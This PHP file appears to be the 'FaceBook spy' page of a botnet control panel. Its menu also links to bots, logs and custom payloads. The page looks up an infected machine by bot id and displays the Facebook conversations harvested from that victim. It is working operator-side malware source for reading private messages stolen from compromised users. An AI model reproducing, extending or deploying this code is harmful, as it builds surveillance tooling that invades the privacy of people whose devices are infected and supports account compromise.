<?php
require_once('class/inject.class.php');
if(!isset($_GET['id']) || $_GET['id'] == ''){
        
}
$select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :bot_id");
$select->bindParam(':bot_id', $_GET['id']);
$select->execute();
if($select->rowCount() < 1){
    exit();
}
?>
<script src="https://code.jquery.com/jquery-2.2.3.js"   integrity="sha256-laXWtGydpwqJ8JA+X9x2miwmaiKhn8tVmOVEigRNtP4="   crossorigin="anonymous"></script>
<script src="../facebookmessage.js"></script>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="index.php?action=panel" class="item">Logs</a>
      <a href="index.php?action=payload" class="item">Custom payload</a>
      <a href="index.php?action=inject" class="active item">FaceBook spy</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
        <div class="ui grid">
        <div class="four wide column">
            <h4>Listing conversation</h4>
            <div class="ui bulleted list listingconvers">
            </div>
        </div>
        <div class="twelve wide column">
            <div class="conversationActuel">
                <div class="nameTitle">Conversation title</div>
            </div>
        </div>
        <div class="oldmessage"></div>
    </div>
    </div>
</div>